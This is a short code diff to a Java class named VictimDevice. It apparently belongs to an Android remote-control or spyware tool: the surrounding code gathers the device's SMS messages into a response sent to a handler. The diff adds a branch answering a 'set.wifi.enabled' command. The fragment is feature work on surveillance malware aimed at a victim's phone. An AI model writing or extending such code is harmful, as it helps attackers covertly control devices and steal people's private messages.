@@ -126,6 +126,8 @@ public class VictimDevice {
                 sms.add(object);
             }
             response.put("sms", sms);
+        } else if (response.get("action").equals("set.wifi.enabled")) {
+            response.put("wifiState", true);
         }
         victimDeviceHandler.sendMessage(response);
     }
